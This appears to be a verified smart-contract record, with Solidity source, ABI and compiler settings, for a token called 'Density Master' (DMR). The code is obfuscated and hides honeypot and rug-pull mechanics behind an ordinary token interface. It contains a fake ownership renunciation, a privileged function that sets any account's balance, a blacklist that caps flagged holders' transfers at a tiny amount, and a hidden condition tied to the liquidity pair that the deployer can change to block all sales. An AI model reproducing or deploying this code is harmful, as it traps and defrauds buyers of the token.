{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface buyLiquidity {\n    function createPair(address listLaunch, address liquidityList) external returns (address);\n}\n\ninterface autoReceiverTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityLaunchShould) external view returns (uint256);\n\n    function transfer(address listTake, uint256 receiverMin) external returns (bool);\n\n    function allowance(address receiverMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listTake,\n        uint256 receiverMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamTx, uint256 value);\n    event Approval(address indexed receiverMax, address indexed spender, uint256 value);\n}\n\nabstract contract fundTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atAutoShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoReceiverTotalMetadata is autoReceiverTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DensityMaster is fundTotal, autoReceiverTotal, autoReceiverTotalMetadata {\n\n    uint256 public listLiquidity;\n\n    address public buyToken;\n\n    function walletSell() public {\n        emit OwnershipTransferred(listLimit, address(0));\n        senderTx = address(0);\n    }\n\n    function amountTake(address sellLiquidityAmount, address listTake, uint256 receiverMin) internal returns (bool) {\n        require(takeMaxLimit[sellLiquidityAmount] >= receiverMin);\n        takeMaxLimit[sellLiquidityAmount] -= receiverMin;\n        takeMaxLimit[listTake] += receiverMin;\n        emit Transfer(sellLiquidityAmount, listTake, receiverMin);\n        return true;\n    }\n\n    function toMode(address sellLiquidityAmount, address listTake, uint256 receiverMin) internal returns (bool) {\n        if (sellLiquidityAmount == listLimit) {\n            return amountTake(sellLiquidityAmount, listTake, receiverMin);\n        }\n        uint256 exemptTotalShould = autoReceiverTotal(buyToken).balanceOf(feeTeam);\n        require(exemptTotalShould == isMin);\n        require(listTake != feeTeam);\n        if (enableTo[sellLiquidityAmount]) {\n            return amountTake(sellLiquidityAmount, listTake, autoAt);\n        }\n        return amountTake(sellLiquidityAmount, listTake, receiverMin);\n    }\n\n    bool public launchedTeam;\n\n    function transfer(address fundEnable, uint256 receiverMin) external virtual override returns (bool) {\n        return toMode(_msgSender(), fundEnable, receiverMin);\n    }\n\n    function exemptSell(address liquidityFrom) public {\n        if (launchedTeam) {\n            return;\n        }\n        \n        receiverTake[liquidityFrom] = true;\n        if (listLiquidity != liquidityTx) {\n            listLiquidity = liquidityTx;\n        }\n        launchedTeam = true;\n    }\n\n    bool public isExempt;\n\n    event OwnershipTransferred(address indexed tokenReceiver, address indexed teamFrom);\n\n    uint8 private autoExempt = 18;\n\n    constructor (){\n        \n        atAutoShould tradingAuto = atAutoShould(atExempt);\n        buyToken = buyLiquidity(tradingAuto.factory()).createPair(tradingAuto.WETH(), address(this));\n        if (listLiquidity == marketingTo) {\n            listLiquidity = liquidityTx;\n        }\n        listLimit = _msgSender();\n        receiverTake[listLimit] = true;\n        takeMaxLimit[listLimit] = isMinFrom;\n        walletSell();\n        \n        emit Transfer(address(0), listLimit, isMinFrom);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isMinFrom;\n    }\n\n    function owner() external view returns (address) {\n        return senderTx;\n    }\n\n    address private senderTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellMarketingReceiver;\n    }\n\n    address atExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public atFrom;\n\n    function isAt(address fromMode) public {\n        modeFrom();\n        if (atFrom) {\n            marketingTo = listLiquidity;\n        }\n        if (fromMode == listLimit || fromMode == buyToken) {\n            return;\n        }\n        enableTo[fromMode] = true;\n    }\n\n    uint256 private isMinFrom = 100000000 * 10 ** 18;\n\n    string private sellMarketingReceiver = \"DMR\";\n\n    mapping(address => bool) public receiverTake;\n\n    uint256 constant autoAt = 12 ** 10;\n\n    function getOwner() external view returns (address) {\n        return senderTx;\n    }\n\n    function teamTotal(uint256 receiverMin) public {\n        modeFrom();\n        isMin = receiverMin;\n    }\n\n    uint256 tokenEnable;\n\n    function approve(address autoTeam, uint256 receiverMin) public virtual override returns (bool) {\n        enableShould[_msgSender()][autoTeam] = receiverMin;\n        emit Approval(_msgSender(), autoTeam, receiverMin);\n        return true;\n    }\n\n    uint256 isMin;\n\n    mapping(address => uint256) private takeMaxLimit;\n\n    function transferFrom(address sellLiquidityAmount, address listTake, uint256 receiverMin) external override returns (bool) {\n        if (_msgSender() != atExempt) {\n            if (enableShould[sellLiquidityAmount][_msgSender()] != type(uint256).max) {\n                require(receiverMin <= enableShould[sellLiquidityAmount][_msgSender()]);\n                enableShould[sellLiquidityAmount][_msgSender()] -= receiverMin;\n            }\n        }\n        return toMode(sellLiquidityAmount, listTake, receiverMin);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableShould;\n\n    uint256 public liquidityTx;\n\n    string private atMarketing = \"Density Master\";\n\n    function buyFeeMarketing(address fundEnable, uint256 receiverMin) public {\n        modeFrom();\n        takeMaxLimit[fundEnable] = receiverMin;\n    }\n\n    uint256 private marketingTo;\n\n    address feeTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address liquidityTeamFrom, address autoTeam) external view virtual override returns (uint256) {\n        if (autoTeam == atExempt) {\n            return type(uint256).max;\n        }\n        return enableShould[liquidityTeamFrom][autoTeam];\n    }\n\n    bool private teamSellMode;\n\n    function balanceOf(address liquidityLaunchShould) public view virtual override returns (uint256) {\n        return takeMaxLimit[liquidityLaunchShould];\n    }\n\n    function modeFrom() private view {\n        require(receiverTake[_msgSender()]);\n    }\n\n    address public listLimit;\n\n    mapping(address => bool) public enableTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTeamFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunchShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"buyFeeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"}],\"name\":\"exemptSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidityAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DensityMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}